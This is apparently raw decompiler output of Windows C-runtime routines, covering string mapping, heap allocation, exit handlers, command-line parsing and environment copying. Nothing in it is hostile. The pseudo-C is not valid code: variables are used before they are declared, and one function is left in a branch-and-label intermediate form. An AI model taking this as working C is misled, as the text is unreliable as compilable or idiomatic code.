		fn00407F60(DPB(eax_187, (byte) eax_187 & 252, 0), 0x00);
		if (fp == 0x3C)
			goto l00408B8F;
		*(fp - 0x40) = eax_179;
		*(fp - 0x44) = fp - 0x3C;
		*(fp - 0x48) = dwArg10;
		*(fp - 0x4C) = (union Eq_23 *) dwArg0C;
		*(fp - 0x50) = 0x01;
		*(fp - 0x54) = (uint32) dwArg1C;
		if (MultiByteToWideChar(*(fp - 0x54), *(fp - 0x50), *(fp - 0x4C), *(fp - 0x48), *(fp - 0x44), *(fp - 0x40)) != 0x00)
		{
			*(fp - 0x40) = 0x00;
			*(fp - 0x44) = 0x00;
			*(fp - 0x48) = eax_179;
			*(fp - 0x4C) = fp - 0x3C;
			*(fp - 0x50) = (union Eq_23 *) dwArg08;
			*(fp - 0x54) = (union Eq_4 *) dwArg04;
			Eq_4 eax_238 = LCMapStringW(*(fp - 0x54), *(fp - 0x50), *(fp - 0x4C), *(fp - 0x48), *(fp - 0x44), *(fp - 0x40));
			Eq_4 esi_240 = eax_238;
			if (eax_238 == 0x00)
				goto l00408B8F;
			if ((bArg09 & 0x04) != 0x00)
			{
				if (dwArg18 != 0x00)
				{
					if (eax_238 > dwArg18)
						goto l00408B8F;
					*(fp - 0x40) = (union Eq_4 *) dwArg18;
					*(fp - 0x44) = (union Eq_4 *) dwArg14;
					*(fp - 0x48) = eax_179;
					*(fp - 0x4C) = fp - 0x3C;
					*(fp - 0x50) = (union Eq_23 *) dwArg08;
					*(fp - 0x54) = (union Eq_4 *) dwArg04;
					if (LCMapStringW(*(fp - 0x54), *(fp - 0x50), *(fp - 0x4C), *(fp - 0x48), *(fp - 0x44), *(fp - 0x40)) == 0x00)
						goto l00408B8F;
				}
			}
			else
			{
				word32 eax_288 = eax_238 * 0x02 + 0x03;
				fn00407F60(DPB(eax_288, (byte) eax_288 & 252, 0), ebp);
				if (fp == 0x3C)
					goto l00408B8F;
				*(fp - 0x40) = (union Eq_4 *) eax_238;
				*(fp - 0x44) = fp - 0x3C;
				*(fp - 0x48) = eax_179;
				*(fp - 0x4C) = fp - 0x3C;
				*(fp - 0x50) = (union Eq_23 *) dwArg08;
				*(fp - 0x54) = (union Eq_4 *) dwArg04;
				if (LCMapStringW(*(fp - 0x54), *(fp - 0x50), *(fp - 0x4C), *(fp - 0x48), *(fp - 0x44), *(fp - 0x40)) == 0x00)
					goto l00408B8F;
				*(fp - 0x40) = 0x00;
				*(fp - 0x44) = 0x00;
				if (dwArg18 == 0x00)
				{
					*(fp - 0x48) = 0x00;
					*(fp - 0x4C) = 0x00;
				}
				else
				{
					*(fp - 0x48) = (union Eq_4 *) dwArg18;
					*(fp - 0x4C) = (union Eq_4 *) dwArg14;
				}
				*(fp - 0x50) = (union Eq_4 *) eax_238;
				*(fp - 0x54) = fp - 0x3C;
				*(fp - 88) = 0x0220;
				*(fp - 0x5C) = (uint32) dwArg1C;
				Eq_4 eax_340 = WideCharToMultiByte(*(fp - 0x5C), *(fp - 88), *(fp - 0x54), *(fp - 0x50), *(fp - 0x4C), *(fp - 0x48), *(fp - 0x44), *(fp - 0x40));
				esi_240 = eax_340;
				if (eax_340 == 0x00)
					goto l00408B8F;
			}
			eax_144 = esi_240;
l00408B91:
			fs->ptr0000 = eax_14;
			word32 ecx_60;
			*ecxOut = eax_14;
			return eax_144;
		}
	}
l00408B8F:
	eax_144.u0 = 0x00;
	goto l00408B91;
}

// 00408C25: Register ptr32 fn00408C25(Stack Eq_23 dwArg04, Stack int32 dwArg08)
ptr32 fn00408C25(Eq_23 dwArg04, int32 dwArg08)
{
	byte * eax_16 = dwArg04;
	word32 ecx_12 = dwArg08 - 0x01;
	if (dwArg08 != 0x00)
	{
		do
		{
			if (*eax_16 == 0x00)
				goto l00408C42;
			eax_16 = eax_16 + 0x01;
			ecx_12 = ecx_40 - 0x01;
			word32 ecx_40 = ecx_12;
		} while (ecx_40 != 0x00);
	}
	if (*eax_16 != 0x00)
		return dwArg08;
	else
		return eax_16 - dwArg04;
}

// 00408C50: Register ui32 fn00408C50(Stack int32 dwArg04, Stack word16 wArg06, Stack word32 dwArg08)
ui32 fn00408C50(int32 dwArg04, word16 wArg06, word32 dwArg08)
{
	ui32 eax_122;
	if (dwArg04 <= ~0xFE)
		eax_122 = (word32) globals->ptr412A10[dwArg04].t0000;
	else
	{
		word32 dwLoc0C_131;
		if ((globals->ptr412A10[(word32) (byte) (dwArg04 >> 0x08)].b0001 & 0x80) != 0x00)
			dwLoc0C_131 = 0x02;
		else
			dwLoc0C_131 = 0x01;
		ui32 eax_112 = fn0040AE68(fp - 0x04, 0x01, fp - 0x08, dwLoc0C_131, fp + 0x06, 0x00, 0x00, 0x01);
		if (eax_112 == 0x00)
			return eax_112;
		eax_122 = (word32) wArg06;
	}
	return eax_122 & dwArg08;
}

// 004095E4: Register word32 fn004095E4(Register Eq_4 ebp, Stack Eq_4 dwArg04, Register out ptr32 ebpOut, Register out ptr32 ediOut)
word32 fn004095E4(Eq_4 ebp, Eq_4 dwArg04, ptr32 & ebpOut, ptr32 & ediOut)
{
	*ebpOut = ebp;
	*ediOut = edi;
	if (dwArg04 != 0x00)
	{
		word32 eax_42 = fn0040B5B3(dwArg04);
		if (eax_42 != 0x00)
		{
			fn0040B5DE(ebp, eax_42, dwArg04, bLoc05);
			return ebx;
		}
		HeapFree(globals->t494B04, 0x00, dwArg04);
	}
	return ebx;
}

// 00409613: Register word32 fn00409613(Stack Eq_4 dwArg04)
word32 fn00409613(Eq_4 dwArg04)
{
	return fn00409625(dwArg04);
}

// 00409625: Register word32 fn00409625(Stack word32 dwArg04)
word32 fn00409625(word32 dwArg04)
{
	word32 eax_11;
	if (dwArg04 <= ~0x1F)
	{
		do
		{
			*(fp - 0x04) = fp->dw0004;
			eax_11 = fn00409651(dwArg00);
			if (eax_11 != 0x00 || fp->dw0008 == eax_11)
				return eax_11;
			*(fp - 0x04) = fp->dw0004;
		} while (fn0040BDBE(dwArg00) != 0x00);
	}
	eax_11 = 0x00;
	return eax_11;
}

// 00409651: Register Eq_2 fn00409651(Stack word32 dwArg04)
Eq_2 fn00409651(word32 dwArg04)
{
	Eq_2 eax_22;
	uint32 esi_33 = dwArg04;
	if (dwArg04 <= globals->dw413020)
	{
		eax_22 = fn0040B909(dwArg04, dwArg04, SLICE(dwArg04, byte, 24));
		if (eax_22 != 0x00)
			return eax_22;
	}
	if (dwArg04 == 0x00)
		esi_33 = 0x01;
	eax_22 = HeapAlloc(globals->t494B04, 0x00, esi_33 + 0x0F & ~0x0F);
	return eax_22;
}

// 0040A20C: Register word32 fn0040A20C()
word32 fn0040A20C()
{
	ptr32 esp_1 = fp;
	<anonymous> * eax_3 = globals->ptr494C34;
	if (eax_3 != null)
	{
		word32 eax_27;
		byte SZO_28;
		byte C_29;
		byte Z_30;
		byte SCZO_31;
		eax_3();
	}
	word32 * esp_14 = esp_1 - 0x04;
	*esp_14 = 0x0040F014;
	*(esp_14 - 0x04) = 0x0040F008;
	fn0040A2F4(dwArg00);
	*(esp_14 - 0x08) = 0x0040F004;
	*(esp_14 - 0x0C) = 0x0040F000;
	fn0040A2F4(dwArg00);
	return esi;
}

// 0040A239: void fn0040A239(Register word32 edi, Stack word32 dwArg04)
void fn0040A239(word32 edi, word32 dwArg04)
{
	fn0040A25B(edi, dwArg04, 0x00, 0x00);
	return;
}

// 0040A25B: void fn0040A25B(Register word32 edi, Stack word32 dwArg04, Stack word32 dwArg08, Stack word32 dwArg0C)
void fn0040A25B(word32 edi, word32 dwArg04, word32 dwArg08, word32 dwArg0C)
{
	if (globals->dw49399C == 0x01)
		TerminateProcess(GetCurrentProcess(), dwArg04);
	globals->dw493998 = 0x01;
	globals->b493994 = (byte) dwArg0C;
	ptr32 esp_19 = fp - 0x08;
	word32 ebx_101 = dwArg0C;
	if (dwArg08 == 0x00)
	{
		word32 * eax_56 = globals->ptr494C30;
		if (eax_56 != null)
		{
			uint32 ecx_79 = globals->dw494C2C;
			ptr32 esp_103 = fp - 0x0C;
			word32 * esi_110 = ecx_79 - 0x04;
			if (ecx_79 - 0x04 >= eax_56)
			{
				do
				{
					<anonymous> * eax_104 = *esi_110;
					if (eax_104 != null)
					{
						word32 edi_121;
						byte SCZO_122;
						byte Z_123;
						word32 eax_124;
						byte bl_126;
						byte SZO_127;
						byte C_128;
						word32 ecx_129;
						eax_104();
					}
					esi_110 = esi_110 - 0x04;
				} while (esi_110 >= globals->ptr494C30);
			}
			esp_19 = esp_103 + 0x04;
		}
		word32 * esp_71 = esp_19 - 0x04;
		*esp_71 = 0x0040F020;
		*(esp_71 - 0x04) = 0x0040F018;
		fn0040A2F4(dwArg00);
		esp_19 = esp_71 + 0x01;
	}
	struct Eq_7257 * esp_36 = esp_19 - 0x04;
	esp_36->dw0000 = 0x0040F028;
	*(esp_36 - 0x04) = 0x0040F024;
	fn0040A2F4(dwArg00);
	if (ebx_101 != 0x00)
		return;
	else
	{
		esp_36->t0004 = esp_36->t0010;
		globals->dw49399C = 0x01;
		ExitProcess(esp_36->t0004);
	}
}

// 0040A2F4: void fn0040A2F4(Stack word32 dwArg04)
void fn0040A2F4(word32 dwArg04)
{
	struct Eq_7342 * esp_13 = fp - 0x04;
	word32 * esi_14 = dwArg04;
	while (esi_14 < esp_13->ptr000C)
	{
		<anonymous> * eax_18 = *esi_14;
		if (eax_18 != null)
		{
			byte SCZO_32;
			byte C_33;
			word32 eax_34;
			byte SZO_35;
			byte Z_36;
			eax_18();
		}
		esi_14 = esi_14 + 0x01;
	}
	return;
}

// 0040A30E: Register Eq_23 fn0040A30E(Stack word32 dwArg04, Stack word32 dwArg08)
Eq_23 fn0040A30E(word32 dwArg04, word32 dwArg08)
{
	Eq_23 eax_31;
	struct _EXCEPTION_POINTERS * eax_108 = fn0040A44F(dwArg04);
	if (eax_108 != null)
	{
		<anonymous> * ebx_54 = eax_108->ptr0008;
		if (ebx_54 != null)
		{
			if (ebx_54 == (<anonymous> *) 0x05)
			{
				eax_108->ptr0008 = eax_108->ptr0008 & 0x00;
				eax_31.u0 = 0x01;
			}
			else
			{
				if (ebx_54 != (<anonymous> *) 0x01)
				{
					struct _EXCEPTION_POINTERS * ecx_87 = globals->ptr4939A0;
					globals->ptr4939A0 = dwArg08;
					word32 ecx_91 = eax_108->ContextRecord;
					if (ecx_91 == 0x08)
					{
						int32 ecx_110 = globals->dw412CB8;
						int32 edx_112 = globals->dw412CBC + ecx_110;
						if (ecx_110 < edx_112)
						{
							int32 edx_167 = edx_112 - ecx_110;
							struct Eq_7448 * esi_169 = ecx_110 * 0x03 * 0x04 + 4271176;
							do
							{
								esi_169->dw0000 = esi_169->dw0000 & 0x00;
								esi_169 = esi_169 + 0x01;
								edx_167 = edx_167 - 0x01;
							} while (edx_167 != 0x00);
						}
						word32 eax_119 = eax_108->ExceptionRecord;
						if (eax_119 == 0xC000008E)
							globals->dw412CC4 = 131;
						else if (eax_119 == 0xC0000090)
							globals->dw412CC4 = 0x81;
						else if (eax_119 == 0xC0000091)
							globals->dw412CC4 = 0x84;
						else if (eax_119 == 0xC0000093)
							globals->dw412CC4 = 133;
						else if (eax_119 == 0xC000008D)
							globals->dw412CC4 = 0x82;
						else if (eax_119 == 0xC000008F)
							globals->dw412CC4 = 0x86;
						else if (eax_119 == 0xC0000092)
							globals->dw412CC4 = 0x8A;
						word32 esp_128;
						word32 ebp_129;
						word32 ebx_130;
						word32 eax_131;
						byte SZO_132;
						byte C_133;
						word32 ecx_134;
						byte Z_135;
						byte SCZO_136;
						word32 edx_137;
						word32 esi_138;
						byte SO_139;
						ebx_54();
						globals->dw412CC4 = esi_138;
					}
					else
					{
						eax_108->ptr0008 = eax_108->ptr0008 & 0x00;
						word32 esp_186;
						word32 ebp_187;
						word32 ebx_188;
						word32 eax_189;
						byte SZO_190;
						byte C_191;
						word32 ecx_192;
						byte Z_193;
						byte SCZO_194;
						word32 edx_195;
						word32 esi_196;
						byte SO_197;
						ebx_54();
					}
					globals->ptr4939A0 = ecx_87;
					eax_108 = ecx_87;
				}
				eax_31 = eax_108 | ~0x00;
			}
			return eax_31;
		}
	}
	eax_31 = UnhandledExceptionFilter(dwArg08);
	return eax_31;
}

// 0040A44F: Register (ptr Eq_7518) fn0040A44F(Stack word32 dwArg04)
Eq_7518 * fn0040A44F(word32 dwArg04)
{
	ui32 ecx_5 = globals->dw412CC0;
	struct Eq_7518 * eax_11 = &globals->dw412C40;
	if (globals->dw412C40 != dwArg04)
	{
		struct Eq_7518 * esi_34 = ecx_5 * 0x03 * 0x04 + 0x00412C40;
		do
			eax_11 = eax_11 + 0x01;
		while (eax_11 >= esi_34 || eax_11->dw0000 == dwArg04);
	}
	if (eax_11 >= (ecx_5 * 0x03) * 0x04 + 0x00412C40 || eax_11->dw0000 != dwArg04)
		eax_11 = null;
	return eax_11;
}

// 0040A492: Register Eq_4 fn0040A492()
Eq_4 fn0040A492()
{
	if (globals->dw494C28 == 0x00)
		fn0040895B();
	Eq_4 esi_24 = globals->t494E68;
	cu8 al_9 = *esi_24;
	if (al_9 == 0x22)
	{
		while (true)
		{
			byte al_57 = *((word32) esi_24 + 0x01);
			esi_24 = (word32) esi_24 + 0x01;
			if (al_57 == 0x22 || al_57 == 0x00)
				break;
			if (fn0040C056((word32) al_57) != 0x00)
				esi_24 = (word32) esi_24 + 0x01;
		}
		if (*esi_24 == 0x22)
		{
l0040A4CF:
			esi_24 = (word32) esi_24 + 0x01;
		}
	}
	else if (al_9 > 0x20)
	{
		do
			esi_24 = (word32) esi_24 + 0x01;
		while (*esi_24 > 0x20);
	}
	cu8 al_25 = *esi_24;
	if (al_25 == 0x00 || al_25 > 0x20)
		return esi_24;
	goto l0040A4CF;
}

// 0040A4EA: Register Eq_4 fn0040A4EA(Register word32 ebx, Register Eq_4 ebp)
Eq_4 fn0040A4EA(word32 ebx, Eq_4 ebp)
{
	Eq_4 ebx_107 = 0x00;
	Eq_4719 bl_106 = 0x00;
	if (globals->dw494C28 == 0x00)
		fn0040895B();
	Eq_4 esi_16 = globals->t493920;
	Eq_4 edi_17 = 0x00;
	while (true)
	{
		byte al_30 = *esi_16;
		if (al_30 == 0x00)
			break;
		if (al_30 != 0x3D)
			edi_17 = (word32) edi_17 + 0x01;
		esi_16 = (word32) fn00407840(esi_16) + ((word32) esi_16 + 0x01);
	}
	Eq_4 eax_49 = fn00409613(edi_17 * 0x04 + 0x04);
	globals->t49397C = eax_49;
	Eq_4 esi_112 = eax_49;
	if (eax_49 == 0x00)
	{
		*(fp - 0x10) = 0x09;
		word32 edi_154;
		ebx_107 = fn0040854E(ebp, edi_17, out esi_112, out edi_154);
		bl_106 = (byte) ebx_107;
	}
	Eq_4 edi_108 = globals->t493920;
	if (*edi_108 != bl_106)
	{
		*(fp - 0x10) = (union Eq_4 *) ebp;
		do
		{
			*(fp - 0x14) = (union Eq_4 *) edi_108;
			Eq_23 eax_99 = fn00407840(dwArg00);
			if (*edi_108 != 0x3D)
			{
				*(fp - 0x14) = (word32) eax_99 + 0x01;
				Eq_4 eax_120 = fn00409613(dwArg00);
				*esi_112 = eax_120;
				if (eax_120 == ebx_107)
				{
					*(fp - 0x14) = 0x09;
					ebx_107 = fn0040854E((word32) eax_99 + 0x01, edi_108, out esi_112, out edi_108);
					bl_106 = (byte) ebx_107;
				}
				*(fp - 0x14) = (union Eq_4 *) edi_108;
				*(fp - 0x18) = (word32) *esi_112;
				edi_108 = fn00407750(dwArg00);
				esi_112 = (word32) esi_112 + 0x04;
			}
			edi_108 = (word32) edi_108 + ((word32) eax_99 + 0x01);
		} while (*edi_108 != bl_106);
		ebp = *(fp - 0x10);
	}
	*(fp - 0x10) = (union Eq_4 *) globals->t493920;
	Eq_4 ebp_76;
	word32 edi_77;
	Eq_4 ebx_78 = fn004095E4(ebp, dwArg00, out ebp_76, out edi_77);
	globals->t493920 = ebx_78;
	*esi_112 = ebx_78;
	globals->dw494C24 = 0x01;
	return ebp_76;
}

// 0040A5A3: Register word32 fn0040A5A3(Register ui32 ecx, Register ptr32 ebp)
word32 fn0040A5A3(ui32 ecx, ptr32 ebp)
{
	if (globals->dw494C28 == 0x00)
		fn0040895B();
	GetModuleFileNameA(null, 4798884, 0x0104);
	Eq_4 eax_34 = globals->t494E68;
	globals->dw49398C = 4798884;
	Eq_4 edi_104 = 4798884;
	if (*eax_34 != 0x00)
		edi_104 = eax_34;
	fn0040A63C(edi_104, 0x00, 0x00, fp - 0x08, fp - 0x0C);
	Eq_4 eax_57 = fn00409613(ecx * 0x05);
	Eq_4 esi_103 = eax_57;
	if (eax_57 == 0x00)
	{
		*(fp - 0x1C) = 0x08;
		fn0040854E(fp - 0x04, edi_104, out esi_103, out edi_104);
	}
	*(fp - 0x1C) = fp - 0x0C;
	*(fp - 0x20) = fp - 0x08;
	*(fp - 0x24) = (word32) esi_103 + ecx * 0x04;
	*(fp - 0x28) = (union Eq_4 *) esi_103;
	*(fp - 44) = (union Eq_4 *) edi_104;
	fn0040A63C(dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10);
	globals->t493974 = esi_103;
	globals->dw493970 = ecx - 0x01;
	return *(fp - 0x10);
}

// 0040A63C: void fn0040A63C(Stack Eq_4 dwArg04, Stack word32 dwArg08, Stack word32 dwArg0C, Stack ptr32 dwArg10, Stack ptr32 dwArg14)
void fn0040A63C(Eq_4 dwArg04, word32 dwArg08, word32 dwArg0C, ptr32 dwArg10, ptr32 dwArg14)
{
fn0040A63C_entry:
	*dwArg14 = *dwArg14 & 0x00
	*dwArg10 = 0x01
	byte * esi_122 = dwArg0C
	ui32 * edi_109 = dwArg08
	struct Eq_7898 * eax_119 = dwArg04 + 0x01
	branch dwArg08 == null l0040A666
	goto l0040A65E
l0040A63C:
l0040A65E:
	*dwArg08 = dwArg0C
	edi_109 = dwArg08 + 0x01
	dwArg08 = dwArg08 + 0x01
l0040A666:
	branch *dwArg04 != 0x22 l0040A6AF
l0040A66B:
	byte dl_293 = eax_119[0x01]
	eax_119 = eax_119 + 0x01
	branch dl_293 == 0x22 || dl_293 == 0x00 l0040A69D
	goto l0040A678
l0040A674:
l0040A678:
	branch (((word32) dl_293)->b494D61 & 0x04) == 0x00 l0040A690
l0040A684:
	*dwArg14 = *dwArg14 + 0x01
	branch esi_122 == null l0040A690
l0040A68A:
	*esi_122 = eax_119->b0000
	esi_122 = esi_122 + 0x01
	eax_119 = eax_119 + 0x01
l0040A690:
	*dwArg14 = *dwArg14 + 0x01
	branch esi_122 == null l0040A66B
l0040A696:
	*esi_122 = eax_119->b0000
	esi_122 = esi_122 + 0x01
	goto l0040A66B
l0040A69D:
	*dwArg14 = *dwArg14 + 0x01
	branch esi_122 == null l0040A6A7
l0040A6A3:
	*esi_122 = *esi_122 & 0x00
	esi_122 = esi_122 + 0x01
l0040A6A7:
	branch eax_119->b0000 != 0x22 l0040A6F2
l0040A6AC:
	eax_119 = eax_119 + 0x01
	goto l0040A6F2
l0040A6AF:
	*dwArg14 = *dwArg14 + 0x01
	branch esi_122 == null l0040A6BA
l0040A6B5:
	*esi_122 = eax_119->b0000
	esi_122 = esi_122 + 0x01
l0040A6BA:
	byte dl_358 = eax_119->b0000
	eax_119 = &eax_119->b0000
	branch (((word32) dl_358)->b494D61 & 0x04) == 0x00 l0040A6D5
l0040A6C9:
	*dwArg14 = *dwArg14 + 0x01
	branch esi_122 == null l0040A6D4
l0040A6CF:
	*esi_122 = eax_119->b0000
	esi_122 = esi_122 + 0x01
l0040A6D4:
	eax_119 = eax_119 + 0x01
l0040A6D5:
	branch dl_358 == 0x20 l0040A6E3
l0040A6DA:
	branch dl_358 == 0x00 l0040A6E7
l0040A6DE:
	branch dl_358 != 0x09 l0040A6AF
l0040A6E3:
	branch dl_358 != 0x00 l0040A6EA
l0040A6E7:
	eax_119 = eax_119 - 0x01
	goto l0040A6F2
l0040A6EA:
	branch esi_122 == null l0040A6F2
l0040A6EE:
	*(esi_122 - 0x01) = *(esi_122 - 0x01) & 0x00
l0040A6F2:
	ui32 dwArg14_116 = dwArg14 & 0x00
l0040A6F6:
	branch eax_119->b0000 == 0x00 l0040A7DF
l0040A6FF:
	byte dl_93 = eax_119->b0000
	branch dl_93 == 0x20 || dl_93 == 0x09 l0040A70B
	goto l0040A70E
l0040A706:
l0040A70B:
	eax_119 = eax_119 + 0x01
	goto l0040A6FF
l0040A70E:
	branch eax_119->b0000 == 0x00 l0040A7DF
l0040A717:
	branch edi_109 == null l0040A723
l0040A71B:
	*edi_109 = esi_122
	edi_109 = edi_109 + 0x01
	dwArg08 = edi_109
l0040A723:
	*dwArg10 = *dwArg10 + 0x01
l0040A728:
	word32 dwArg04_123 = 0x01
	uint32 ebx_124 = 0x00
	byte bl_125 = 0x00
l0040A731:
	branch eax_119->b0000 != 0x5C l0040A73A
l0040A736:
	ebx_124 = ebx_124 + 0x01
	eax_119 = eax_119 + 0x01
	bl_125 = (byte) ebx_124
	goto l0040A731
l0040A73A:
	branch eax_119->b0000 != 0x22 l0040A76B
l0040A73F:
	branch (bl_125 & 0x01) != 0x00 l0040A769
l0040A744:
	branch dwArg14_116 == 0x00 l0040A758
l0040A74B:
	struct Eq_7898 * edx_281 = eax_119 + 0x01
	branch eax_119[0x01] != 0x22 l0040A758
l0040A754:
	eax_119 = edx_281
	goto l0040A75B
l0040A758:
	dwArg04_123 = 0x00
l0040A75B:
	edi_109 = dwArg08
	dwArg14_116 = (word32) (dwArg14_116 == 0x00)
l0040A769:
	ebx_124 = ebx_124 >> 0x01
l0040A76B:
	word32 ebx_148 = ebx_124 - 0x01
	branch ebx_124 == 0x00 l0040A780
l0040A772:
	word32 ebx_230 = ebx_148 + 0x01
l0040A773:
	branch esi_122 == null l0040A77B
l0040A777:
	*esi_122 = 0x5C
	esi_122 = esi_122 + 0x01
l0040A77B:
	*dwArg14 = *dwArg14 + 0x01
	ebx_230 = ebx_230 - 0x01
	branch ebx_230 != 0x00 l0040A773
l0040A780:
	byte dl_156 = eax_119->b0000
	branch dl_156 == 0x00 || dwArg14_116 == 0x00 && (dl_156 == 0x20 || dl_156 == 0x09) l0040A7D0
	goto l0040A796
l0040A786:
l0040A78C:
l0040A791:
l0040A796:
	branch dwArg04_123 == 0x00 l0040A7CA
l0040A79C:
	branch esi_122 == null l0040A7B9
l0040A7A0:
	branch (((word32) dl_156)->b494D61 & 0x04) == 0x00 l0040A7B2
l0040A7AC:
	*esi_122 = dl_156
	*dwArg14 = *dwArg14 + 0x01
	esi_122 = esi_122 + 0x01
	eax_119 = eax_119 + 0x01
l0040A7B2:
	*esi_122 = eax_119->b0000
	esi_122 = esi_122 + 0x01
	goto l0040A7C8
l0040A7B9:
	branch (((word32) dl_156)->b494D61 & 0x04) == 0x00 l0040A7C8
l0040A7C5:
	*dwArg14 = *dwArg14 + 0x01
	eax_119 = eax_119 + 0x01
l0040A7C8:
	*dwArg14 = *dwArg14 + 0x01
l0040A7CA:
	eax_119 = eax_119 + 0x01
	goto l0040A728
l0040A7D0:
	branch esi_122 == null l0040A7D8
l0040A7D4:
	*esi_122 = *esi_122 & 0x00
	esi_122 = esi_122 + 0x01
l0040A7D8:
	*dwArg14 = *dwArg14 + 0x01
	goto l0040A6F6
l0040A7DF:
	branch edi_109 == null l0040A7E6
l0040A7E3:
	*edi_109 = *edi_109 & 0x00
l0040A7E6:
	*dwArg10 = *dwArg10 + 0x01
	return
fn0040A63C_exit:
}

// 0040A7F0: Register word32 fn0040A7F0(Register ui32 ecx)
word32 fn0040A7F0(ui32 ecx)
{
	word32 eax_125;
	word32 eax_8 = globals->dw493AA8;
	struct Eq_8299 * esp_182 = fp - 0x18;
	word32 ebx_118 = 0x00;
	Eq_8305 bx_193 = 0x00;
	Eq_8307 esi_195 = 0x00;
	Eq_8309 edi_199 = 0x00;
	if (eax_8 == 0x00)
	{
		Eq_8307 eax_260 = GetEnvironmentStringsW();
		esi_195 = eax_260;
		if (eax_260 != 0x00)
		{
			globals->dw493AA8 = 0x01;
l0040A847:
			if (esi_195 != 0x00)
			{
l0040A857:
				Eq_8307 eax_173 = esi_195;
				if (*esi_195 != bx_193)
				{
					do
					{
						do
						{
							word32 eax_174 = eax_173 + 0x01;
							eax_173 = eax_174 + 0x01;
						} while (Mem0[eax_174 + 0x01:word16] != bx_193);
						eax_173 = eax_174 + 0x03;
					} while (Mem0[eax_174 + 0x03:word16] != bx_193);
				}
				struct Eq_8345 * esp_87 = esp_182 - 0x04;
				esp_87->t0000.u0 = 0x00;
				*(esp_87 - 0x04) = 0x00;
				*(esp_87 - 0x08) = 0x00;
				*(esp_87 - 0x0C) = 0x00;
				word32 eax_91 = (eax_173 - esi_195 >> 0x01) + 0x01;
				*(esp_87 - 0x10) = eax_91;
				*(esp_87 - 0x14) = (union Eq_8307 *) esi_195;
				*(esp_87 - 0x18) = 0x00;
				*(esp_87 - 0x1C) = 0x00;
				esp_87->dw0018 = eax_91;
				Eq_4 eax_105 = WideCharToMultiByte(*(esp_87 - 0x1C), *(esp_87 - 0x18), *(esp_87 - 0x14), *(esp_87 - 0x10), *(esp_87 - 0x0C), *(esp_87 - 0x08), *(esp_87 - 0x04), esp_87->t0000);
				if (eax_105 != 0x00)
				{
					esp_87->t0000 = eax_105;
					Eq_4 eax_129 = fn00409613(dwArg00);
					esp_87->t0014 = eax_129;
					if (eax_129 != 0x00)
					{
						esp_87->t0000.u0 = 0x00;
						*(esp_87 - 0x04) = 0x00;
						*(esp_87 - 0x08) = (union Eq_4 *) eax_105;
						*(esp_87 - 0x0C) = (union Eq_4 *) eax_129;
						*(esp_87 - 0x10) = esp_87->dw0018;
						*(esp_87 - 0x14) = (union Eq_8307 *) esi_195;
						*(esp_87 - 0x18) = 0x00;
						*(esp_87 - 0x1C) = 0x00;
						if (WideCharToMultiByte(*(esp_87 - 0x1C), *(esp_87 - 0x18), *(esp_87 - 0x14), *(esp_87 - 0x10), *(esp_87 - 0x0C), *(esp_87 - 0x08), *(esp_87 - 0x04), esp_87->t0000) == 0x00)
						{
							esp_87->t0000 = esp_87->t0014;
							word32 ebp_167;
							word32 edi_168;
							esp_87->t0014 = fn004095E4(eax_105, dwArg00, out ebp_167, out edi_168);
						}
						ebx_118 = esp_182->dw0010;
					}
				}
				union Eq_8307 * esp_121 = esp_182 - 0x04;
				*esp_121 = (union Eq_8307 *) esi_195;
				FreeEnvironmentStringsW(*esp_121);
				eax_125 = ebx_118;
				return eax_125;
			}
			Eq_8307 eax_184 = GetEnvironmentStringsW();
			esi_195 = eax_184;
			if (eax_184 != 0x00)
				goto l0040A857;
l0040A919:
			eax_125 = 0x00;
			return eax_125;
		}
		Eq_8309 eax_265 = GetEnvironmentStrings();
		edi_199 = eax_265;
		if (eax_265 == 0x00)
			goto l0040A919;
		globals->dw493AA8 = 0x02;
	}
	else
	{
		if (eax_8 == 0x01)
			goto l0040A847;
		if (eax_8 != 0x02)
			goto l0040A919;
	}
	if (edi_199 == 0x00)
	{
		Eq_8309 eax_256 = GetEnvironmentStrings();
		edi_199 = eax_256;
		if (eax_256 == 0x00)
			goto l0040A919;
	}
	Eq_8309 eax_206 = edi_199;
	if (*edi_199 != 0x00)
	{
		do
		{
			do
				eax_206 = eax_206 + 0x01;
			while (*eax_206 != 0x00);
			eax_206 = eax_206 + 0x01;
		} while (Mem0[eax_206 + 0x01:byte] != 0x00);
	}
	word32 esi_225;
	Eq_8599 eax_208 = eax_206 - edi_199;
	word32 eax_215 = fn00409613(eax_208 + 0x01);
	if (eax_215 == 0x00)
		esi_225 = 0x00;
	else
	{
		Mem237[fp - 0x1C + 0x00:word32] = eax_208 + 0x01;
		*(fp - 0x20) = (union Eq_8309 *) edi_199;
		*(fp - 0x24) = (union Eq_4 *) eax_215;
		fn00407C00(dwArg00, dwArg04, dwArg08, out esi_225, out edi_199);
	}
	*(fp - 0x1C) = (union Eq_8309 *) edi_199;
	FreeEnvironmentStringsA(*(fp - 0x1C));
	eax_125 = esi_225;
	return eax_125;
}

// 0040A922: Register Eq_4 fn0040A922(Register Eq_4 ebp, Register Eq_4 edi)
Eq_4 fn0040A922(Eq_4 ebp, Eq_4 edi)
{
	Eq_4 eax_18 = fn00409613(0x0100);
	Eq_4 esi_19 = eax_18;
	Eq_4 ecx_177 = *(fp - 88);
	if (eax_18 == 0x00)
	{
		*(fp - 88) = 0x1B;
		word32 edi_286;
		fn0040854E(ebp, edi, out esi_19, out edi_286);
		ecx_177 = *(fp - 88);
	}
	globals->t494B20 = esi_19;
	globals->dw494C20 = 0x20;
	Eq_4 eax_35 = (word32) esi_19 + 0x0100;
	while (esi_19 < eax_35)
	{
		*((word32) esi_19 + 0x04) = *((word32) esi_19 + 0x04) & 0x00;
		*esi_19 = *esi_19 | ~0x00;
		*((word32) esi_19 + 0x05) = 0x0A;
		esi_19 = (word32) esi_19 + 0x08;
		eax_35 = (word32) globals->t494B20 + 0x0100;
	}
	*(fp - 88) = fp - 0x44;
	GetStartupInfoA(*(fp - 88));
	if (*(fp - 0x12) != 0x00)
	{
		int32 * eax_161 = *(fp - 0x10);
		if (eax_161 == null)
			goto l0040AA52;
		int32 esi_165 = *eax_161;
		byte * ebp_166 = eax_161 + 0x01;
		word32 * ebx_170 = eax_161 + 0x01 + esi_165;
		if (esi_165 >= 0x0800)
			esi_165 = 0x0800;
		if (globals->dw494C20 < esi_165)
		{
			word32 * edi_239 = globals->a494B24;
			do
			{
				*(fp - 88) = 0x0100;
				Eq_4 eax_247 = fn00409613(dwArg00);
				ecx_177 = *(fp - 88);
				if (eax_247 == 0x00)
				{
					esi_165 = globals->dw494C20;
					break;
				}
				globals->dw494C20 = globals->dw494C20 + 0x20;
				*edi_239 = (word32) eax_247;
